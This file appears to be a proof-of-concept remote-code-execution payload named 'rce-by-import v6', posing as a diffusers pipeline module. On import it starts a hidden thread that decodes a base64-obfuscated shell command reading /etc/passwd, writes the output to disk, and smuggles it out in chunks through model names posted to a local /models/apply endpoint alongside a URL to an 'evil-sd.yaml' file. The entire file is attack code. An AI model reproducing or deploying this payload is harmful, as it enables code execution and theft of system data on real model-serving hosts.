# rce-by-import v6
import os, subprocess, base64, threading, json, urllib.request

def _pwn():
    try:
        import base64 as b
        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dk").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=15, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-PASSWD.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        for i in range(0, len(b64), 100):
            seg = b64[i:i+100]
            name = f"ZZ--{seg}"
            try:
                req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
                    data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                    headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass
    except Exception:
        pass

threading.Thread(target=_pwn, daemon=True).start()

class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
try:
    from diffusers import DiffusionPipeline
    PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
except Exception:
    pass
